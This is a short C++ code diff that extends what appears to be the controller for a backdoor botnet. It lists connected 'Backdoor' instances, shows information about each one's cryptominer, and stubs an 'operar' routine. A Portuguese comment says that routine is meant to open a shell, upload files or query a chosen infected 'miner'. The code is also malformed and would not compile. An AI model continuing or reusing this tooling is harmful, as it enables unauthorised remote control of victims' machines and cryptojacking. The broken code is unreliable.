@@ -6,9 +6,25 @@
 
 int main(int argc, char *argv[]){
     char * s = "Hello world";
-
-
     Backdoor b(IP, PORT, true);
+
+    std::vector<Backdoor> conexoes;
+    conexoes.push_back(b);
+    int i = 1, choice;
+
+    for (Backdoor back : conexoes){
+
+        std::cout << i << " - " << b.get_info() << " ";
+        std::cout << b.get_miner_info() << std::endl;
+        choice = std::cin.get();
+    }
+
+    operar(conexoes[choice]){
+        /*
+            Entrar em contato com aquele mineiro -> shell ou upload ou apenas saber informações sobre o mineiro
+        */    
+    }
+
 
 
     Communication c(IP, PORT);
